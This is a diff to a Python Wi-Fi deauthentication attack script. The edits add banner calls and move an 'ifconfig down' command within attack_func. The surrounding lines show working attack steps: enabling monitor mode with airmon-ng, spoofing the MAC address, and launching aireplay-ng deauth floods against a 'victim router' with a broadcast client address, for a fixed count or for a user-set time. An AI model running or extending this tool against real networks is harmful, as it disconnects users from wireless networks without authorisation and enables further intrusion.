@@ -169,7 +169,6 @@ def attack_func(network_interface, attack_mode):
     subprocess.run(["clear"])
     get_colours("\n[*] Setting up network card...", "yellow")
     os.system(f"sudo ifconfig {network_interface} down")  # To Avoid channel problems.
-    os.system(f"sudo ifconfig {network_interface} down")
     time.sleep(2)
     subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
     get_colours("\n[!] Generating new Mac Address...", "cyan")
@@ -204,6 +203,7 @@ def attack_func(network_interface, attack_mode):
         os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
         time.sleep(2)
         subprocess.run(["clear"])
+        script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
@@ -214,6 +214,7 @@ def attack_func(network_interface, attack_mode):
             sys.stdout.write("\033[F")
             time.sleep(1)
         os.system('clear')
+        script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         timer_process = range(9, 0, -1)
         for i in timer_process:
@@ -284,6 +285,7 @@ def attack_func(network_interface, attack_mode):
         attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
+        os.system(f"sudo ifconfig {network_interface} down")
         try:
             process.wait(timeout=2)  # Time for the process
         except subprocess.TimeoutExpired:
@@ -293,6 +295,7 @@ def attack_func(network_interface, attack_mode):
         os.system(
             f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
         subprocess.run(["clear"])
+        script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = process1.communicate()
@@ -303,6 +306,7 @@ def attack_func(network_interface, attack_mode):
             sys.stdout.write("\033[F")
             time.sleep(1)
         os.system('clear')
+        script_banner()
         get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
         timer_process = range(9, 0, -1)
         for i in timer_process:
